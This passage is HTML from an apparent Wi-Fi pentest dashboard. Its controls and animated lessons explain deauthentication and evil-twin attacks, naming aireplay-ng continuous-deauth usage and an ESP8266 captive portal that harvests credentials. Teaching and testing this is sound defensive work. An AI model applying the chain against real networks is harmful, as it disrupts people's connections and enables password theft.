      <path d="M4 10c2.2-2.2 4.8-3.5 8-3.5s5.8 1.3 8 3.5" opacity="0.6"/>
      <path d="M7 14c1.3-1.3 2.8-2 5-2s3.7 0.7 5 2" opacity="0.35"/>
      <circle cx="12" cy="19" r="2" fill="currentColor" stroke="none"/>
    </svg>
    WIFI PENTEST DASHBOARD
  </div>
  <div class="status-pills">
    <div class="pill" id="pill-mon">MONITOR: OFF</div>
    <div class="pill" id="pill-scan">SCAN: IDLE</div>
    <div class="pill" id="pill-deauth">DEAUTH: OFF</div>
  </div>
  <div id="clock"></div>
</header>

<!-- SIDEBAR -->
<aside class="sidebar">
  <div class="ctrl-block">
    <div class="ctrl-label">Interface</div>
    <select id="iface-select"><option value="">— select —</option></select>
    <button class="btn btn-success" id="mon-start-btn" onclick="startMonitor()">Enable Monitor</button>
    <button class="btn btn-warning" id="mon-stop-btn" onclick="stopMonitor()">Disable Monitor</button>
  </div>

  <div class="ctrl-block">
    <div class="ctrl-label">Network Scan</div>
    <button class="btn btn-primary" onclick="startScan()">Start Scan</button>
    <button class="btn btn-outline" onclick="stopScan()">Stop Scan</button>
  </div>

  <div class="nav-tabs">
    <div class="section-label">Navigation</div>

    <button class="tab-btn active" onclick="showTab('learn')" data-tab="learn">
      <svg class="tab-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 .5a.5.5 0 0 1 .5.5v1.5a.5.5 0 0 1-1 0V1A.5.5 0 0 1 8 .5zm0 3a4.5 4.5 0 1 0 0 9 4.5 4.5 0 0 0 0-9zM2 8a6 6 0 1 1 12 0A6 6 0 0 1 2 8zm8.5 0a.5.5 0 0 1-.5.5H8a.5.5 0 0 1-.5-.5V5.5a.5.5 0 0 1 1 0V7.5H10a.5.5 0 0 1 .5.5z"/></svg>
      Learn
    </button>
    <button class="tab-btn" onclick="showTab('scan')" data-tab="scan">
      <svg class="tab-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M0 8a8 8 0 1 0 16 0A8 8 0 0 0 0 8zm7.5-6.923c-.67.204-1.335.82-1.887 1.855A7.97 7.97 0 0 0 5.145 4H7.5V1.077zM4.09 4a9.267 9.267 0 0 1 .64-1.539 6.7 6.7 0 0 1 .597-.933A7.025 7.025 0 0 0 2.255 4H4.09zm-.582 3.5c.03-.877.138-1.718.312-2.5H1.674a6.958 6.958 0 0 0-.656 2.5h2.49zM4.847 5a12.5 12.5 0 0 0-.338 2.5H7.5V5H4.847zM8.5 5v2.5h2.99a12.495 12.495 0 0 0-.337-2.5H8.5zM4.51 8.5a12.5 12.5 0 0 0 .337 2.5H7.5V8.5H4.51zm3.99 0V11h2.653c.187-.765.306-1.608.338-2.5H8.5zM5.145 12c.138.386.295.744.468 1.068.552 1.035 1.218 1.65 1.887 1.855V12H5.145zm.182 2.472a6.696 6.696 0 0 1-.597-.933A9.268 9.268 0 0 1 4.09 12H2.255a7.024 7.024 0 0 0 3.072 2.472zM3.82 11a13.652 13.652 0 0 1-.312-2.5h-2.49c.062.89.291 1.733.656 2.5H3.82zm6.853 3.472A7.024 7.024 0 0 0 13.745 12H11.91a9.27 9.27 0 0 1-.64 1.539 6.688 6.688 0 0 1-.597.933zM8.5 12v2.923c.67-.204 1.335-.82 1.887-1.855.173-.324.33-.682.468-1.068H8.5zm3.68-1h2.146c.365-.767.594-1.61.656-2.5h-2.49a13.65 13.65 0 0 1-.312 2.5zm2.802-3.5a6.959 6.959 0 0 0-.656-2.5H12.18c.174.782.282 1.623.312 2.5h2.49zM11.27 2.461c.247.464.462.98.64 1.539h1.835a7.024 7.024 0 0 0-3.072-2.472c.218.284.418.598.597.933zM10.855 4a7.966 7.966 0 0 0-.468-1.068C9.835 1.897 9.17 1.282 8.5 1.077V4h2.355z"/></svg>
      Networks
    </button>
    <button class="tab-btn" onclick="showTab('clients')" data-tab="clients">
      <svg class="tab-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z"/></svg>
      Clients
    </button>
    <button class="tab-btn" onclick="showTab('attack')" data-tab="attack">
      <svg class="tab-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M11.534 7h3.932a.25.25 0 0 1 .192.41l-1.966 2.36a.25.25 0 0 1-.384 0l-1.966-2.36a.25.25 0 0 1 .192-.41zm-11 2h3.932a.25.25 0 0 0 .192-.41L2.692 6.23a.25.25 0 0 0-.384 0L.342 8.59A.25.25 0 0 0 .534 9zM8 3c-1.552 0-2.94.707-3.857 1.818a.5.5 0 1 1-.771-.636A6.002 6.002 0 0 1 13.917 7H12.9A5.002 5.002 0 0 0 8 3zM3.1 9a5.002 5.002 0 0 0 8.757 2.182.5.5 0 1 1 .771.636A6.002 6.002 0 0 1 2.083 9H3.1z"/></svg>
      Attack
    </button>
  </div>
</aside>

<!-- MAIN CONTENT -->
<main>

  <!-- LEARN TAB -->
  <div class="tab-panel active" id="tab-learn">
    <div class="panel-title">Educational Overview</div>
    <div class="panel-sub">How deauthentication and evil twin attacks work — step by step, with animations</div>

    <div class="stepper-nav">
      <button class="step-btn active" onclick="setLearnStep(0)">01 — 802.11 Basics</button>
      <button class="step-btn" onclick="setLearnStep(1)">02 — Deauth Attack</button>
      <button class="step-btn" onclick="setLearnStep(2)">03 — Evil Twin</button>
      <button class="step-btn" onclick="setLearnStep(3)">04 — Full Chain</button>
      <button class="step-btn" onclick="setLearnStep(4)">05 — Defenses</button>
    </div>

    <!-- Step 0: 802.11 Basics -->
    <div class="learn-step active" id="step-0">
      <div class="learn-grid">
        <div class="concept-card" style="grid-column:1/-1">
          <div class="concept-header">
            <div class="concept-num">01</div>
            <div class="concept-title">How Wi-Fi Communication Works</div>
          </div>
          <div class="concept-body">
            <p>Before understanding attacks, you need to know how Wi-Fi devices communicate. Every Wi-Fi device has a <strong>MAC address</strong> — a unique hardware identifier like <code>AA:BB:CC:DD:EE:FF</code>. The router (Access Point / AP) has one, and every connected device has one.</p>
            <p>Wi-Fi communication uses three types of frames:</p>
            <div class="anim-box">
              <svg viewBox="0 0 660 120" xmlns="http://www.w3.org/2000/svg">
                <rect x="10" y="16" width="200" height="88" rx="4" fill="#161b22" stroke="#3fb950"/>
                <text x="110" y="36" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#3fb950">MANAGEMENT FRAMES</text>
                <text x="110" y="52" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">Beacon, Probe, Auth,</text>
                <text x="110" y="64" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">Association, Deauth</text>
                <text x="110" y="92" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#f85149">No signature — VULNERABLE</text>

                <rect x="230" y="16" width="200" height="88" rx="4" fill="#161b22" stroke="#d29922"/>
                <text x="330" y="36" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#d29922">CONTROL FRAMES</text>
                <text x="330" y="52" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">RTS, CTS, ACK</text>
                <text x="330" y="64" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">Channel access control</text>
                <text x="330" y="92" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">Low-level timing</text>

                <rect x="450" y="16" width="200" height="88" rx="4" fill="#161b22" stroke="#58a6ff"/>
                <text x="550" y="36" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#58a6ff">DATA FRAMES</text>
                <text x="550" y="52" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">Actual internet traffic</text>
                <text x="550" y="64" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">Encrypted with WPA2/WPA3</text>
                <text x="550" y="92" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#58a6ff">Protected by encryption</text>
              </svg>
            </div>
            <p>The key weakness: <strong>Management frames were designed without authentication</strong>. Any device can send a management frame claiming to be any other device. This flaw from the original 802.11 spec (1997) is what makes deauth attacks possible.</p>
            <ul>
              <li>AP broadcasts <strong>Beacon frames</strong> every ~100ms announcing its SSID, channel, and capabilities</li>
              <li>Client sends <strong>Probe Request</strong> looking for known networks; AP replies with <strong>Probe Response</strong></li>
              <li>After connecting, client and AP exchange <strong>Association frames</strong></li>
              <li>Either side can send a <strong>Deauthentication frame</strong> to terminate the session — nobody verifies who sent it</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <!-- Step 1: Deauth -->
    <div class="learn-step" id="step-1">
      <div class="learn-grid">
        <div class="concept-card" style="grid-column:1/-1">
          <div class="concept-header">
            <div class="concept-num">02</div>
            <div class="concept-title">Deauthentication Attack — Step by Step</div>
          </div>
          <div class="concept-body">
            <p>A deauth attack exploits the unauthenticated management frame vulnerability to forcibly disconnect a client from its AP. <strong>The attacker does not need the Wi-Fi password.</strong></p>
            <div class="anim-box">
              <!-- Phase label area fixed height at top, nodes below -->
              <svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg">

                <!-- Fixed label container — one at a time, no overlap -->
                <rect x="0" y="0" width="680" height="22" fill="#0d1117"/>
                <!-- Phase 1 label -->
                <text x="340" y="14" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#3fb950">
                  <animate attributeName="opacity" values="1;1;0;0;0;0;0" keyTimes="0;0.16;0.2;0.4;0.6;0.85;1" dur="7s" repeatCount="indefinite"/>
                  PHASE 1 — Normal connection: data flows freely
                </text>
                <!-- Phase 2 label -->
                <text x="340" y="14" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#d29922" opacity="0">
                  <animate attributeName="opacity" values="0;0;1;1;0;0;0" keyTimes="0;0.18;0.22;0.48;0.52;0.7;1" dur="7s" repeatCount="indefinite"/>
                  PHASE 2 — Attacker enables monitor mode, captures BSSID
                </text>
                <!-- Phase 3 label -->
                <text x="340" y="14" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;1;1;0" keyTimes="0;0.5;0.55;0.58;0.62;0.65;0.9;1" dur="7s" repeatCount="indefinite"/>
                  PHASE 3 — Deauth frames injected, spoofed as AP → client disconnects
                </text>

                <!-- AP box -->
                <rect x="30" y="50" width="80" height="100" rx="4" fill="#161b22" stroke="#21262d"/>
                <text x="70" y="46" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">ACCESS POINT</text>
                <text x="70" y="100" text-anchor="middle" font-size="22">📡</text>
                <text x="70" y="118" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#3fb950">HomeNet</text>
                <text x="70" y="130" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#8b949e">B0:19:21:B9:B7:26</text>
                <!-- Beacon pulse -->
                <circle cx="70" cy="90" r="0" fill="none" stroke="#3fb950" stroke-width="0.8">
                  <animate attributeName="r" values="0;38" dur="2s" repeatCount="indefinite"/>
                  <animate attributeName="opacity" values="0.5;0" dur="2s" repeatCount="indefinite"/>
                </circle>
                <circle cx="70" cy="90" r="0" fill="none" stroke="#3fb950" stroke-width="0.8">
                  <animate attributeName="r" values="0;38" dur="2s" begin="0.8s" repeatCount="indefinite"/>
                  <animate attributeName="opacity" values="0.5;0" dur="2s" begin="0.8s" repeatCount="indefinite"/>
                </circle>

                <!-- Client box -->
                <rect x="560" y="50" width="80" height="100" rx="4" fill="#161b22" stroke="#21262d"/>
                <text x="600" y="46" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">CLIENT</text>
                <text x="600" y="100" text-anchor="middle" font-size="22">📱</text>
                <text x="600" y="118" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">OnePlus Nord 3</text>
                <text x="600" y="130" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#8b949e">8A:C5:05:8D:59:6B</text>
                <!-- Disconnect flash -->
                <rect x="560" y="50" width="80" height="100" rx="4" fill="rgba(248,81,73,0.15)" stroke="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;1;0;1;0" keyTimes="0;0.62;0.65;0.68;0.7;0.72;0.74;0.79;0.83;0.88" dur="7s" repeatCount="indefinite"/>
                </rect>

                <!-- Attacker box -->
                <rect x="275" y="130" width="100" height="60" rx="4" fill="#161b22" stroke="#f85149"/>
                <text x="325" y="126" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#f85149">ATTACKER</text>
                <text x="325" y="165" text-anchor="middle" font-size="18">💻</text>
                <text x="325" y="182" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#f85149">wlan1mon</text>

                <!-- Phase 1 normal green data packets -->
                <circle r="5" fill="#3fb950" cx="110" cy="100">
                  <animateTransform attributeName="transform" type="translate" values="0,0;420,0" dur="1.1s" repeatCount="indefinite" begin="0s"/>
                  <animate attributeName="opacity" values="0;1;1;0" keyTimes="0;0.05;0.9;1" dur="1.1s" repeatCount="indefinite"/>
                  <animate attributeName="opacity" values="1;1;0;0" keyTimes="0;0.15;0.19;1" dur="7s" repeatCount="indefinite"/>
                </circle>
                <circle r="5" fill="#3fb950" cx="110" cy="100">
                  <animateTransform attributeName="transform" type="translate" values="0,0;420,0" dur="1.1s" repeatCount="indefinite" begin="0.45s"/>
                  <animate attributeName="opacity" values="0;1;1;0" keyTimes="0;0.05;0.9;1" dur="1.1s" repeatCount="indefinite" begin="0.45s"/>
                  <animate attributeName="opacity" values="1;1;0;0" keyTimes="0;0.15;0.19;1" dur="7s" repeatCount="indefinite"/>
                </circle>

                <!-- Phase 2 monitor mode amber sweep -->
                <circle cx="325" cy="160" r="0" fill="none" stroke="#d29922" stroke-width="1">
                  <animate attributeName="r" values="0;90" dur="1.5s" repeatCount="indefinite" begin="1.5s"/>
                  <animate attributeName="opacity" values="0.6;0" dur="1.5s" repeatCount="indefinite" begin="1.5s"/>
                </circle>
                <text x="325" y="112" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#d29922" opacity="0">
                  <animate attributeName="opacity" values="0;0;1;1;0;0;0" keyTimes="0;0.2;0.24;0.46;0.5;0.6;1" dur="7s" repeatCount="indefinite"/>
                  CAPTURING BSSID...
                </text>

                <!-- Phase 3 red deauth packets attacker→client -->
                <circle r="6" fill="#f85149" cx="375" cy="160">
                  <animateTransform attributeName="transform" type="translate" values="0,0;225,-60" dur="0.55s" repeatCount="indefinite" begin="4.2s"/>
                  <animate attributeName="opacity" values="0;0;0;0;0;0;0;1;0;1;0" keyTimes="0;0.55;0.57;0.59;0.61;0.62;0.63;0.65;0.7;0.72;0.76" dur="7s" repeatCount="indefinite"/>
                </circle>
                <circle r="6" fill="#f85149" cx="375" cy="160">
                  <animateTransform attributeName="transform" type="translate" values="0,0;225,-60" dur="0.55s" repeatCount="indefinite" begin="4.55s"/>
                  <animate attributeName="opacity" values="0;0;0;0;0;0;0;1;0;1;0" keyTimes="0;0.55;0.57;0.59;0.61;0.62;0.63;0.65;0.7;0.72;0.76" dur="7s" repeatCount="indefinite"/>
                </circle>
                <circle r="6" fill="#f85149" cx="375" cy="160">
                  <animateTransform attributeName="transform" type="translate" values="0,0;225,-60" dur="0.55s" repeatCount="indefinite" begin="4.9s"/>
                  <animate attributeName="opacity" values="0;0;0;0;0;0;0;1;0;1;0" keyTimes="0;0.55;0.57;0.59;0.61;0.62;0.63;0.65;0.7;0.72;0.76" dur="7s" repeatCount="indefinite"/>
                </circle>
                <!-- DEAUTH label near client -->
                <text x="520" y="44" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;1;0;1;0" keyTimes="0;0.62;0.64;0.68;0.7;0.72;0.74;0.8;0.85;0.9" dur="7s" repeatCount="indefinite"/>
                  DEAUTH!
                </text>
                <!-- SPOOFED label -->
                <text x="325" y="112" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;1;1;0" keyTimes="0;0.6;0.62;0.64;0.65;0.66;0.68;0.88;0.92" dur="7s" repeatCount="indefinite"/>
                  SPOOFED AS AP → CLIENT
                </text>
              </svg>
            </div>
            <ul>
              <li><strong>Step 1 — Passive recon:</strong> Attacker puts adapter in monitor mode, runs airodump-ng to find AP and client MAC addresses</li>
              <li><strong>Step 2 — Frame crafting:</strong> aireplay-ng constructs a deauth frame with Addr2 (source) spoofed as the AP's BSSID, Addr1 (destination) as the client MAC</li>
              <li><strong>Step 3 — Injection:</strong> Frame is injected directly into the air — bypasses normal Wi-Fi stack, no authentication required</li>
              <li><strong>Step 4 — Client reacts:</strong> Phone receives the frame, trusts it (no signature to verify), drops the connection</li>
              <li><strong>Step 5 — Repeat:</strong> With -0 0 (infinite), new deauth frames fire every ~100ms — client cannot reconnect to real AP</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <!-- Step 2: Evil Twin -->
    <div class="learn-step" id="step-2">
      <div class="learn-grid">
        <div class="concept-card" style="grid-column:1/-1">
          <div class="concept-header">
            <div class="concept-num">03</div>
            <div class="concept-title">Evil Twin — How the Fake AP Works</div>
          </div>
          <div class="concept-body">
            <p>An Evil Twin attack creates a rogue AP that <strong>exactly mimics a legitimate network</strong> — same SSID, same channel. The goal: trick the victim's device into connecting to the attacker instead of the real router.</p>
            <p>In this setup, a <strong>custom-flashed ESP8266</strong> runs firmware that broadcasts a configurable open-network SSID. When the client disconnects from the real AP (via deauth), it scans and auto-connects to the familiar network name. The ESP8266 serves a <strong>fake captive portal</strong> that captures the entered credentials.</p>
            <div class="anim-box">
              <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
                <text x="340" y="14" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">SEQUENCE: client disconnects → scans → connects to evil twin → captive portal</text>

                <!-- Real AP -->
                <rect x="20" y="30" width="85" height="110" rx="4" fill="#161b22" stroke="#3fb950"/>
                <text x="62" y="26" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#3fb950">REAL AP</text>
                <text x="62" y="80" text-anchor="middle" font-size="20">📡</text>
                <text x="62" y="98" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#3fb950">HomeNet</text>
                <text x="62" y="110" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#8b949e">ch.6 | -62dBm</text>
                <text x="62" y="122" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#8b949e">WPA2</text>
                <!-- Grey out during deauth -->
                <rect x="20" y="30" width="85" height="110" rx="4" fill="rgba(13,17,23,0.82)" stroke="#30363d" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;1;1;1;1" keyTimes="0;0.2;0.26;0.32;0.55;0.9;1" dur="8s" repeatCount="indefinite"/>
                </rect>
                <text x="62" y="155" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;1;0;1;0;0" keyTimes="0;0.18;0.23;0.28;0.31;0.36;0.45" dur="8s" repeatCount="indefinite"/>
                  DEAUTH!
                </text>

                <!-- Evil Twin AP -->
                <rect x="240" y="30" width="85" height="110" rx="4" fill="#161b22" stroke="#f85149"/>
                <text x="282" y="26" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#f85149">EVIL TWIN</text>
                <text x="282" y="80" text-anchor="middle" font-size="20">💀</text>
                <text x="282" y="98" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#f85149">HomeNet</text>
                <text x="282" y="110" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#f85149">ch.6 | -44dBm | OPEN</text>
                <text x="282" y="122" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#f85149">ESP8266 firmware</text>
                <!-- Signal rings -->
                <circle cx="282" cy="70" r="0" fill="none" stroke="#f85149" stroke-width="0.8">
                  <animate attributeName="r" values="0;48" dur="2s" repeatCount="indefinite"/>
                  <animate attributeName="opacity" values="0.6;0" dur="2s" repeatCount="indefinite"/>
                </circle>
                <circle cx="282" cy="70" r="0" fill="none" stroke="#f85149" stroke-width="0.8">
                  <animate attributeName="r" values="0;48" dur="2s" begin="0.8s" repeatCount="indefinite"/>
                  <animate attributeName="opacity" values="0.6;0" dur="2s" begin="0.8s" repeatCount="indefinite"/>
                </circle>

                <!-- Client -->
                <rect x="550" y="40" width="85" height="100" rx="4" fill="#161b22" stroke="#d29922"/>
                <text x="592" y="36" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#d29922">CLIENT</text>
                <text x="592" y="88" text-anchor="middle" font-size="20">📱</text>
                <text x="592" y="108" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#d29922">Scanning...</text>
                <rect x="550" y="40" width="85" height="100" rx="4" fill="rgba(248,81,73,0.1)" stroke="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;1;1" keyTimes="0;0.56;0.6;0.65;0.7;0.76;0.8;1" dur="8s" repeatCount="indefinite"/>
                </rect>
                <text x="592" y="108" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;1;1" keyTimes="0;0.56;0.6;0.65;0.7;0.76;0.8;1" dur="8s" repeatCount="indefinite"/>
                  Connected!
                </text>
                <text x="592" y="122" text-anchor="middle" font-family="IBM Plex Mono" font-size="6" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;1;1" keyTimes="0;0.56;0.6;0.65;0.7;0.76;0.8;1" dur="8s" repeatCount="indefinite"/>
                  captive portal...
                </text>
                <!-- Connection line client→evil twin -->
                <line x1="550" y1="90" x2="325" y2="90" stroke="#f85149" stroke-dasharray="5,4" stroke-width="1.5" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;1;1" keyTimes="0;0.56;0.6;0.65;0.7;0.76;0.8;1" dur="8s" repeatCount="indefinite"/>
                </line>

                <!-- Phase labels bottom -->
                <text x="340" y="185" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#3fb950">
                  <animate attributeName="opacity" values="1;0;0;0;0;0;0;0" keyTimes="0;0.16;0.2;0.3;0.5;0.7;0.9;1" dur="8s" repeatCount="indefinite"/>
                  Connected to real AP normally
                </text>
                <text x="340" y="185" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;1;1;0;0;0;0;0" keyTimes="0;0.2;0.32;0.38;0.5;0.7;0.9;1" dur="8s" repeatCount="indefinite"/>
                  Deauth frames kick client off real AP
                </text>
                <text x="340" y="185" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#d29922" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;1;1;0;0" keyTimes="0;0.38;0.42;0.46;0.5;0.68;0.72;1" dur="8s" repeatCount="indefinite"/>
                  Client scans — sees "HomeNet" open, picks stronger signal
                </text>
                <text x="340" y="185" text-anchor="middle" font-family="IBM Plex Mono" font-size="9" fill="#f85149" opacity="0">
                  <animate attributeName="opacity" values="0;0;0;0;0;0;0;1;1" keyTimes="0;0.65;0.7;0.72;0.75;0.76;0.78;0.82;1" dur="8s" repeatCount="indefinite"/>
                  Joins evil twin → captive portal harvests credentials
                </text>
              </svg>
            </div>
            <ul>
              <li><strong>SSID cloning:</strong> Custom firmware broadcasts beacons with the same SSID as the target, configured via code</li>
              <li><strong>Open network:</strong> No password required — client connects without prompting for credentials</li>
              <li><strong>Captive portal:</strong> Any HTTP request is intercepted and redirected to a fake login page (served by the ESP8266)</li>
              <li><strong>Credential capture:</strong> Submitted credentials are stored and can be retrieved from the device's memory</li>
              <li><strong>Signal advantage:</strong> ESP8266 placed closer to victim means stronger signal — client auto-selects it</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <!-- Step 3: Full Chain -->
    <div class="learn-step" id="step-3">
      <div class="card">
        <div class="card-title">Full Attack Chain — This Demo</div>
        <svg viewBox="0 0 680 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;background:#0d1117;border-radius:6px">
          <defs>
            <marker id="arr2" markerWidth="7" markerHeight="7" refX="6" refY="3.5" orient="auto">
              <path d="M0,0 L7,3.5 L0,7 Z" fill="#484f58"/>
            </marker>
          </defs>

          <!-- Step 1 -->
          <rect x="12" y="55" width="112" height="75" rx="4" fill="#161b22" stroke="#3fb950"/>
          <text x="68" y="74" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#3fb950">STEP 1</text>
          <text x="68" y="88" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">airmon-ng start</text>
          <text x="68" y="100" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">wlan1</text>
          <text x="68" y="116" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#3fb950">Monitor Mode ON</text>
          <text x="68" y="22" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">Linux CLI</text>
          <line x1="124" y1="92" x2="145" y2="92" stroke="#484f58" stroke-width="1.5" marker-end="url(#arr2)"/>

          <!-- Step 2 -->
          <rect x="145" y="55" width="112" height="75" rx="4" fill="#161b22" stroke="#58a6ff"/>
          <text x="201" y="74" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#58a6ff">STEP 2</text>
          <text x="201" y="88" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">airodump-ng</text>
          <text x="201" y="100" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">wlan1mon</text>
          <text x="201" y="116" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#58a6ff">Find AP + Client MACs</text>
          <text x="201" y="22" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">This Dashboard</text>
          <line x1="257" y1="92" x2="278" y2="92" stroke="#484f58" stroke-width="1.5" marker-end="url(#arr2)"/>

          <!-- Step 3 -->
          <rect x="278" y="55" width="112" height="75" rx="4" fill="#161b22" stroke="#f85149"/>
          <text x="334" y="74" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#f85149">STEP 3</text>
          <text x="334" y="88" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">aireplay-ng</text>
          <text x="334" y="100" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">-0 0 -a BSSID -c MAC</text>
          <text x="334" y="116" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#f85149">Continuous Deauth</text>
          <text x="334" y="22" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">This Dashboard</text>
          <line x1="390" y1="92" x2="411" y2="92" stroke="#484f58" stroke-width="1.5" marker-end="url(#arr2)"/>

          <!-- Step 4 -->
          <rect x="411" y="55" width="112" height="75" rx="4" fill="#161b22" stroke="#bc8cff"/>
          <text x="467" y="74" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#bc8cff">STEP 4</text>
          <text x="467" y="88" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">ESP8266</text>
          <text x="467" y="100" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">Custom firmware</text>
          <text x="467" y="116" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#bc8cff">Clone SSID + Portal</text>
          <text x="467" y="22" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">Standalone device</text>
          <line x1="523" y1="92" x2="544" y2="92" stroke="#484f58" stroke-width="1.5" marker-end="url(#arr2)"/>

          <!-- Result -->
          <rect x="544" y="55" width="124" height="75" rx="4" fill="#161b22" stroke="#d29922"/>
          <text x="606" y="74" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#d29922">RESULT</text>
          <text x="606" y="89" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">Phone disconnects,</text>
          <text x="606" y="101" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">sees familiar SSID,</text>
          <text x="606" y="116" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#d29922">credentials harvested</text>
          <text x="606" y="22" text-anchor="middle" font-family="IBM Plex Mono" font-size="7" fill="#8b949e">Victim device</text>

          <!-- Parallel note -->
          <text x="467" y="152" text-anchor="middle" font-family="IBM Plex Mono" font-size="8" fill="#8b949e">Steps 3 and 4 run simultaneously</text>
          <line x1="278" y1="143" x2="656" y2="143" stroke="#30363d" stroke-width="0.8" stroke-dasharray="3,3"/>
          <line x1="334" y1="130" x2="334" y2="143" stroke="#30363d" stroke-width="0.8"/>
          <line x1="467" y1="130" x2="467" y2="143" stroke="#30363d" stroke-width="0.8"/>
        </svg>
      </div>
    </div>

    <!-- Step 4: Defenses -->
    <div class="learn-step" id="step-4">
      <div class="learn-grid">
        <div class="concept-card">
          <div class="concept-header">
            <div class="concept-num">05a</div>
            <div class="concept-title">802.11w — Protected Management Frames</div>
          </div>
          <div class="concept-body">
            <p><strong>PMF (802.11w)</strong> was introduced in 2009. It cryptographically signs deauth and disassociation frames using the same keys from the WPA2/WPA3 handshake. Without a valid signature, the client drops the frame.</p>
            <div class="anim-box">
              <svg viewBox="0 0 400 120" xmlns="http://www.w3.org/2000/svg">
